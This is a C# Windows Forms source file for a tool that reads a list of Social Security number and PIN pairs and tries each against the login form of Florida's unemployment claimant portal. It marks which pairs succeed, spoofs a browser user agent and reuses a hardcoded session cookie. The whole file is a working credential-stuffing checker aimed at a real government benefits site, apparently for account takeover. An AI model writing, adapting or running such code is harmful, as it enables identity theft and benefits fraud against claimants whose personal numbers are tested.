using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using myDLL;

namespace 主程序202105
{
    public partial class myflorida : Form
    {
        public myflorida()
        {
            InitializeComponent();
        }
        #region POST请求
        /// <summary>
        /// POST请求
        /// </summary>
        /// <param name="url">请求地址</param>
        /// <param name="postData">发送的数据包</param>
        /// <param name="COOKIE">cookie</param>
        /// <param name="charset">编码格式</param>
        /// <returns></returns>
        public static string PostUrl(string url, string postData, string COOKIE)
        {
            try
            {
                string html = "";
                System.Net.ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12; //获取不到加上这一条
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = "Post";
                //添加头部
                //WebHeaderCollection headers = request.Headers;
                //headers.Add("sec-fetch-mode:navigate");
                //headers.Add("sec-fetch-site:same-origin");
                //headers.Add("sec-fetch-user:?1");
                //headers.Add("upgrade-insecure-requests: 1");
                //添加头部
                 request.ContentType = "application/x-www-form-urlencoded";
            
                //request.ContentType = "application/json";
                request.ContentLength = Encoding.UTF8.GetBytes(postData).Length;
                // request.ContentLength = postData.Length;
                request.Headers.Add("Accept-Encoding", "gzip");
                request.AllowAutoRedirect = false;
                request.KeepAlive = true;

                request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36";
                request.Headers.Add("Cookie", COOKIE);

                request.Referer = "https://connect.myflorida.com/Claimant/Core/Login.ASPX";
                StreamWriter sw = new StreamWriter(request.GetRequestStream());
                sw.Write(postData);
                sw.Flush();

                HttpWebResponse response = request.GetResponse() as HttpWebResponse;  //获取反馈
                if (response.StatusCode == HttpStatusCode.Redirect)
                {
                    url = response.GetResponseHeader("Location");
                    response.Close();
                    return url;
                }
                else
                {
                    return "";
                }


               
               
            }
            catch (WebException ex)
            {

                return ex.ToString();
            }


        }

        Thread thread;
        bool zanting = true;
        bool status = true;
        string cookie = "f5avraaaaaaaaaaaaaaaa_session_=FLNEIHOHEFPDOAFGEIDAIKNJFIBLIEMGMGJPMBMOIPAKMAALLFLMOCGGOGONPEGEJFHDLODPGMGCOGNPJEDAKGHPOCCOIFHOOBPKDLJLKJFHJFNBMKFLMMCKDAIDEOPL; f5_cspm=1234; _ga=GA1.1.702621053.1620302713; _ga_457L8LBC7Y=GS1.1.1620302712.1.0.1620302739.0; ASP.NET_SessionId=yyit42gqvc2hck2cs3adcnfn; BIGipServerCONNECT_PROD_WEB_POOL=688132268.16671.0000; f5avraaaaaaaaaaaaaaaa_session_=CJJMGMLFBNECJCKCDCGKNGHPKFGOFGKLJOEKADANGJOJNJKDMFEHHJCHMAANDGDOHDODAKOBIMGBKABOONCAIECCOCJGKICNMIIMLIJBBHLPAFKEAPDHIFPFGACJHGPI; f5avr2072380561aaaaaaaaaaaaaaaa_cspm_=KDDEJBNPELNOENIAMBNEBJKDDLJEBDHHKAKHOHFFICMENAOBAEAILAJMHFACFNLCACPCDEMGJCEMHDMIDJIACBFHANPKMEBMAMLIEFPHJJLGJKEKFHDFBHBCDHFJEBNK";
        #endregion
        public void run()
        {
            method.GetUrlWithCookie("https://connect.myflorida.com/Claimant/Core/Navigate.aspx?Go=Core.Login", cookie, "utf-8");
            Thread.Sleep(2000);
            PostUrl("https://connect.myflorida.com/claimant/core/login.aspx", "__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=&_ctl00%24ctl00%24cphMain%24cphMain%24ChkWarningNoticeAcknowledge=&ctl00%24ctl00%24cphMain%24cphMain%24ChkWarningNoticeAcknowledge=on&ctl00%24ctl00%24cphMain%24cphMain%24btnNext.x=40&ctl00%24ctl00%24cphMain%24cphMain%24btnNext.y=11",cookie);

            try
            {
                if (textBox2.Text == "")
                {
                    MessageBox.Show("请导入账号");
                    return;
                }

                StreamReader sr = new StreamReader(textBox2.Text, method.EncodingType.GetTxtType(textBox2.Text));
                //一次性读取完 
                string texts = sr.ReadToEnd();

                string[] text = texts.Split(new string[] { "\r\n" }, StringSplitOptions.None);
              
                for (int i = 0; i < text.Length; i++)
                {
                    label1.Text = "正在查询：" + text[i];
                    string[] values = text[i].Split(new string[] { "-" }, StringSplitOptions.None);

                   char[] chars = values[0].ToArray();
                    string num1 = chars[0].ToString() + chars[1].ToString() + chars[2].ToString();
                    string num2 = chars[3].ToString() + chars[4].ToString() ;
                    string num3 = chars[5].ToString() + chars[6].ToString() + chars[7].ToString() + chars[8].ToString();


                    string pin = values[1];
                    string url = "https://connect.myflorida.com/Claimant/Core/Login.ASPX";
                  
                    string postdata = "__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=&ctl00%24ctl00%24cphMain%24cphMain%24ClaimantSSN%24ClaimantSSN_part1="+num1+"&ctl00%24ctl00%24cphMain%24cphMain%24ClaimantSSN%24ClaimantSSN_part2="+num2+"&ctl00%24ctl00%24cphMain%24cphMain%24ClaimantSSN%24ClaimantSSN_part3="+num3+"&ctl00%24ctl00%24cphMain%24cphMain%24uClaimantID=&ctl00%24ctl00%24cphMain%24cphMain%24uSSNPIN="+pin+"&ctl00%24ctl00%24cphMain%24cphMain%24btnLoginLogin.x=42&ctl00%24ctl00%24cphMain%24cphMain%24btnLoginLogin.y=9";
                  

                    string html =PostUrl(url,postdata,cookie);
                  // textBox1.Text = html;
                   
                    ListViewItem lv1 = listView1.Items.Add((listView1.Items.Count + 1).ToString()); //使用Listview展示数据
                    lv1.SubItems.Add(values[0]);
                    lv1.SubItems.Add(values[1]);
                    // if (html.Contains("Name: </span>"))
                   
                    if (html.Trim()!="")
                    {
                        lv1.SubItems.Add("true");
                        method.GetUrlWithCookie("https://connect.myflorida.com/Claimant/Core/Navigate.aspx?Go=Core.Login", cookie, "utf-8");
                        Thread.Sleep(2000);
                        PostUrl("https://connect.myflorida.com/claimant/core/login.aspx", "__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=&_ctl00%24ctl00%24cphMain%24cphMain%24ChkWarningNoticeAcknowledge=&ctl00%24ctl00%24cphMain%24cphMain%24ChkWarningNoticeAcknowledge=on&ctl00%24ctl00%24cphMain%24cphMain%24btnNext.x=40&ctl00%24ctl00%24cphMain%24cphMain%24btnNext.y=11", cookie);

                    }
                    else
                    {
                        lv1.SubItems.Add("false");
                    }
                    Thread.Sleep(1000);




                }
                label1.Text = "查询结束";
            }
            catch (Exception ex)
            {

                MessageBox.Show(ex.ToString());
            }
        }

        private void button6_Click(object sender, EventArgs e)
        {
            #region 通用检测


            string html = method.GetUrl("http://www.acaiji.com:8080/api/vip.html", "utf-8");

            if (!html.Contains(@"fualrY"))
            {

                return;
            }

            #endregion
            if (textBox2.Text == "")
            {
                MessageBox.Show("请导入账号密码");
                return;
            }
            status = true;
            if (thread == null || !thread.IsAlive)
            {
                thread = new Thread(run);
                thread.Start();
                Control.CheckForIllegalCrossThreadCalls = false;
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            OpenFileDialog sfd = new OpenFileDialog();
            sfd.Filter = "txt|*.txt";
            sfd.Title = "txt文件导出";


            if (sfd.ShowDialog() == DialogResult.OK)
            {
                textBox2.Text = sfd.FileName;
            }
        }

        private void button5_Click(object sender, EventArgs e)
        {

        }
    }
}
